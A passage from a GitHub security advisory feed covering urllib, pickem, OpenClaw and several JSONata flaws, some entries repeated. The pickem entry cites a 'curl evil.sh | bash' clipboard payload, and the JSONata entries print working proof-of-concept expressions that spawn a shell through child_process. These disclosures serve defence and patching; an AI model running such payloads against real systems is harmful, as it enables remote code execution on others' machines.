<p>This requires no user interaction. Realistic triggers include compromised partner subdomains, DNS hijacking, malicious partner endpoints during onboarding, internal services redirecting across trust boundaries, or an open redirect upstream of urllib's call site.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78">https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/812">https://github.com/node-modules/urllib/pull/812</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/813">https://github.com/node-modules/urllib/pull/813</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16">https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46">https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v2.44.1">https://github.com/node-modules/urllib/releases/tag/v2.44.1</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v4.9.1">https://github.com/node-modules/urllib/releases/tag/v4.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hq3h-g68c-hp78">https://github.com/advisories/GHSA-hq3h-g68c-hp78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq3h-g68c-hp78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:19:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pickem] pickem vulnerable to terminal escape-sequence injection via unsanitized item text]]></title>
        <id>https://github.com/advisories/GHSA-8qx3-8gm5-9cj2</id>
        <link href="https://github.com/advisories/GHSA-8qx3-8gm5-9cj2"/>
        <updated>2026-08-25T15:59:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>pickem rendered item text (label, description, group, meta, name) to the terminal with no control-character sanitization. <code>chrome.row</code> only stripped ANSI from the <strong>active</strong> row; inactive rows, the public <code>createFormatter</code>, and selection-summary lines printed labels <strong>raw</strong>, and the ANSI strip missed bare C0 controls anyway.</p>
<p>Because item text is frequently attacker-controllable (git branch names, PR/issue titles, filenames, npm/API results), a malicious label was a terminal write primitive:</p>
<ul>
<li><strong>OSC 52 clipboard write</strong> — silently load e.g. <code>curl evil.sh | bash</code> into the user's clipboard; their next paste-into-shell is RCE.</li>
<li><strong>Cursor-movement + erase</strong> (<code>ESC[1A</code>, <code>ESC[2K</code>) — overwrite already-printed trusted lines to spoof UI (forge a "✓ Verified publisher", fake prompt, or hide a malicious entry).</li>
<li><strong>BEL / C0 control flooding.</strong></li>
</ul>
<p>Any CLI that passes untrusted strings into pickem choices is affected.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.0.7</strong>. A new <code>sanitizeDisplay()</code> strips every escape sequence except inert SGR (color), plus all C0/C1/DEL control bytes, at the render boundary — applied to every externally-supplied display string across all prompts (<code>select</code>, <code>search</code>, <code>checkbox</code>, <code>searchable-checkbox</code>, <code>input</code>), <code>createFormatter</code>, row meta, and committed selection summaries. Display-only; returned values are unchanged.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to &gt;= 1.0.7. Otherwise, strip C0/C1/DEL control characters and ANSI escape sequences from any untrusted text before passing it to pickem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/calebogden/pickem-oss/security/advisories/GHSA-8qx3-8gm5-9cj2">https://github.com/calebogden/pickem-oss/security/advisories/GHSA-8qx3-8gm5-9cj2</a></li>
<li><a href="https://github.com/calebogden/pickem-oss/releases/tag/v1.0.7">https://github.com/calebogden/pickem-oss/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-8qx3-8gm5-9cj2">https://github.com/advisories/GHSA-8qx3-8gm5-9cj2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qx3-8gm5-9cj2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T15:59:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Slack and Zalo webhook secrets could remain active after secrets.reload]]></title>
        <id>https://github.com/advisories/GHSA-p68j-q8j9-jwf5</id>
        <link href="https://github.com/advisories/GHSA-p68j-q8j9-jwf5"/>
        <updated>2026-08-24T21:06:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-275c-xpvc-jgfw. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.4.22 contains a webhook secret revocation bypass vulnerability allowing callers with old Slack and Zalo webhook secrets to remain active after secrets.reload. Attackers can exploit the stale-secret window to deliver webhook events after operator-expected secret revocation, potentially accepting previous credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-275c-xpvc-jgfw">https://github.com/openclaw/openclaw/security/advisories/GHSA-275c-xpvc-jgfw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53830">https://nvd.nist.gov/vuln/detail/CVE-2026-53830</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-webhook-secret-revocation-bypass-via-secrets-reload">https://www.vulncheck.com/advisories/openclaw-webhook-secret-revocation-bypass-via-secrets-reload</a></li>
<li><a href="https://github.com/advisories/GHSA-p68j-q8j9-jwf5">https://github.com/advisories/GHSA-p68j-q8j9-jwf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p68j-q8j9-jwf5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-13T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-66mm-25pp-rfff</id>
        <link href="https://github.com/advisories/GHSA-66mm-25pp-rfff"/>
        <updated>2026-08-21T21:04:20.000Z</updated>
        <content type="html"><![CDATA[<p>Before JSONata <code>2.2.1</code> and <code>1.8.8</code> it was possible to execute arbitrary code with
crafted expressions, due to:</p>
<ul>
<li>overwriting <code>$clone</code> allowing mutation of objects via transforms (see
<a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1304-L1314"><code>evaluateTransformExpression</code></a>)</li>
<li>it being possible to destruct jsonata functions/lambdas (e.g. <code>$merge.*</code>)</li>
<li><a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1670C20-L1675">applyProcedure</a>
using <code>proc.arguments.forEach</code> and not <code>Array.prototype.forEach</code></li>
</ul>
<p>Which could be chained to execute arbitrary code.</p>
<p>This was fixed with:</p>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a>
(<a href="https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673">https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673</a>)</li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></li>
</ul>
<p>Which are included in the <code>2.2.1</code> release. Fixes were then back-ported to the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
    $obj := {};
    $clone := function($o) { $o };
    $m := ($merge.*)[1];

    $fn := function($a) {
        (
            $a({"value":"lg"},"__lookupGetter__");
            $a({"value":"x"},"x");
        )
    };

    $nop := function() { $ };

    $capture := function($val) {
        $obj ~&gt; | $obj | {"x": 1, "y": 1, "lg":$lg} |
    };

    $ ~&gt; | $ | $m([$nop,{"_jsonata_lambda":false}])|;
    $ ~&gt; | $ | {"arguments":{"forEach": $spread($fn)}}|;
    $ ~&gt; | $ | {"body":$m([$capture,{"_jsonata_lambda":false}]).body}|;
    $func := $m([$,{"_jsonata_lambda":true}]);
    $func();

    $gP := $obj.lg("__proto__");

    $afn:=$spread($fn);
    $afn{"x":$gP().constructor("return process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})")()};
)
`);

await expression.evaluate({});
</code></pre>
<h2 id="references">References</h2>
<ul>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673">https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de">https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/d49dcdd01a4617e5601edda3ce9a971a791126dc">https://github.com/jsonata-js/jsonata/commit/d49dcdd01a4617e5601edda3ce9a971a791126dc</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/e362dfd686c1dadd1dd9324373819be446fd4f04">https://github.com/jsonata-js/jsonata/commit/e362dfd686c1dadd1dd9324373819be446fd4f04</a></p>
</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-66mm-25pp-rfff">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-66mm-25pp-rfff</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/47c0e58542202c705726663166dbee5fcae47d06">https://github.com/jsonata-js/jsonata/commit/47c0e58542202c705726663166dbee5fcae47d06</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e">https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f174348c7fa30f271b63ddedf0767e814004bc4d">https://github.com/jsonata-js/jsonata/commit/f174348c7fa30f271b63ddedf0767e814004bc4d</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-66mm-25pp-rfff">https://github.com/advisories/GHSA-66mm-25pp-rfff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66mm-25pp-rfff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T21:04:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-66mm-25pp-rfff</id>
        <link href="https://github.com/advisories/GHSA-66mm-25pp-rfff"/>
        <updated>2026-08-21T21:04:20.000Z</updated>
        <content type="html"><![CDATA[<p>Before JSONata <code>2.2.1</code> and <code>1.8.8</code> it was possible to execute arbitrary code with
crafted expressions, due to:</p>
<ul>
<li>overwriting <code>$clone</code> allowing mutation of objects via transforms (see
<a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1304-L1314"><code>evaluateTransformExpression</code></a>)</li>
<li>it being possible to destruct jsonata functions/lambdas (e.g. <code>$merge.*</code>)</li>
<li><a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1670C20-L1675">applyProcedure</a>
using <code>proc.arguments.forEach</code> and not <code>Array.prototype.forEach</code></li>
</ul>
<p>Which could be chained to execute arbitrary code.</p>
<p>This was fixed with:</p>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a>
(<a href="https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673">https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673</a>)</li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></li>
</ul>
<p>Which are included in the <code>2.2.1</code> release. Fixes were then back-ported to the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
    $obj := {};
    $clone := function($o) { $o };
    $m := ($merge.*)[1];

    $fn := function($a) {
        (
            $a({"value":"lg"},"__lookupGetter__");
            $a({"value":"x"},"x");
        )
    };

    $nop := function() { $ };

    $capture := function($val) {
        $obj ~&gt; | $obj | {"x": 1, "y": 1, "lg":$lg} |
    };

    $ ~&gt; | $ | $m([$nop,{"_jsonata_lambda":false}])|;
    $ ~&gt; | $ | {"arguments":{"forEach": $spread($fn)}}|;
    $ ~&gt; | $ | {"body":$m([$capture,{"_jsonata_lambda":false}]).body}|;
    $func := $m([$,{"_jsonata_lambda":true}]);
    $func();

    $gP := $obj.lg("__proto__");

    $afn:=$spread($fn);
    $afn{"x":$gP().constructor("return process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})")()};
)
`);

await expression.evaluate({});
</code></pre>
<h2 id="references">References</h2>
<ul>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673">https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de">https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/d49dcdd01a4617e5601edda3ce9a971a791126dc">https://github.com/jsonata-js/jsonata/commit/d49dcdd01a4617e5601edda3ce9a971a791126dc</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></p>
</li>
<li><p><a href="https://github.com/jsonata-js/jsonata/commit/e362dfd686c1dadd1dd9324373819be446fd4f04">https://github.com/jsonata-js/jsonata/commit/e362dfd686c1dadd1dd9324373819be446fd4f04</a></p>
</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-66mm-25pp-rfff">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-66mm-25pp-rfff</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/800">https://github.com/jsonata-js/jsonata/pull/800</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/802">https://github.com/jsonata-js/jsonata/pull/802</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/47c0e58542202c705726663166dbee5fcae47d06">https://github.com/jsonata-js/jsonata/commit/47c0e58542202c705726663166dbee5fcae47d06</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e">https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f174348c7fa30f271b63ddedf0767e814004bc4d">https://github.com/jsonata-js/jsonata/commit/f174348c7fa30f271b63ddedf0767e814004bc4d</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-66mm-25pp-rfff">https://github.com/advisories/GHSA-66mm-25pp-rfff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66mm-25pp-rfff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T21:04:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-2943-5xfg-gq5f</id>
        <link href="https://github.com/advisories/GHSA-2943-5xfg-gq5f"/>
        <updated>2026-08-21T20:58:02.000Z</updated>
        <content type="html"><![CDATA[<p>Before JSONata <code>2.2.1</code> and <code>1.8.8</code> it was possible to execute arbitrary code with
crafted expressions, due to a bypassable <code>hasOwnProperty</code> check in
<code>environment.lookup</code>
<a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1863-L1871">https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1863-L1871</a></p>
<p>This was fixed in <a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a>
(<a href="https://github.com/jsonata-js/jsonata/pull/799/files#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1865-R1865">https://github.com/jsonata-js/jsonata/pull/799/files#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1865-R1865</a>)
which is included in the <code>2.2.1</code> release, and then back-ported to the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
     $hasOwnProperty := $spread($string);
     $__proto__ := $constructor;
     $constructor("return
process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})")();
)`);

await expression.evaluate({});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-2943-5xfg-gq5f">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-2943-5xfg-gq5f</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de">https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2943-5xfg-gq5f">https://github.com/advisories/GHSA-2943-5xfg-gq5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2943-5xfg-gq5f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T20:58:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-2943-5xfg-gq5f</id>
        <link href="https://github.com/advisories/GHSA-2943-5xfg-gq5f"/>
        <updated>2026-08-21T20:58:02.000Z</updated>
        <content type="html"><![CDATA[<p>Before JSONata <code>2.2.1</code> and <code>1.8.8</code> it was possible to execute arbitrary code with
crafted expressions, due to a bypassable <code>hasOwnProperty</code> check in
<code>environment.lookup</code>
<a href="https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1863-L1871">https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1863-L1871</a></p>
<p>This was fixed in <a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a>
(<a href="https://github.com/jsonata-js/jsonata/pull/799/files#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1865-R1865">https://github.com/jsonata-js/jsonata/pull/799/files#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1865-R1865</a>)
which is included in the <code>2.2.1</code> release, and then back-ported to the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
     $hasOwnProperty := $spread($string);
     $__proto__ := $constructor;
     $constructor("return
process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})")();
)`);

await expression.evaluate({});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-2943-5xfg-gq5f">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-2943-5xfg-gq5f</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de">https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2943-5xfg-gq5f">https://github.com/advisories/GHSA-2943-5xfg-gq5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2943-5xfg-gq5f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T20:58:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata: Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-8gq3-vp5j-2grp</id>
        <link href="https://github.com/advisories/GHSA-8gq3-vp5j-2grp"/>
        <updated>2026-08-21T20:57:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Before JSONata <code>2.2.0</code> and <code>1.8.8</code> it was possible to execute arbitrary code with crafted expressions, due to a missing <code>hasOwnProperty</code> check in the <code>lookup</code> function:
<a href="https://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705">https://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705</a></p>
<p>This was fixed with <a href="https://github.com/jsonata-js/jsonata/pull/794">https://github.com/jsonata-js/jsonata/pull/794</a>, which is included in the <code>2.2.0</code> release, and ported in the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
   __lookupSetter__('__proto__')(constructor);
   __defineGetter__('l', constructor("return
process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'}).toString()"));
   valueOf().l
)
`);

await expression.evaluate({});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/794">https://github.com/jsonata-js/jsonata/pull/794</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e">https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d">https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8gq3-vp5j-2grp">https://github.com/advisories/GHSA-8gq3-vp5j-2grp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gq3-vp5j-2grp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T20:57:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] JSONata: Arbitrary Code Execution via crafted JSONata expressions]]></title>
        <id>https://github.com/advisories/GHSA-8gq3-vp5j-2grp</id>
        <link href="https://github.com/advisories/GHSA-8gq3-vp5j-2grp"/>
        <updated>2026-08-21T20:57:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Before JSONata <code>2.2.0</code> and <code>1.8.8</code> it was possible to execute arbitrary code with crafted expressions, due to a missing <code>hasOwnProperty</code> check in the <code>lookup</code> function:
<a href="https://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705">https://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705</a></p>
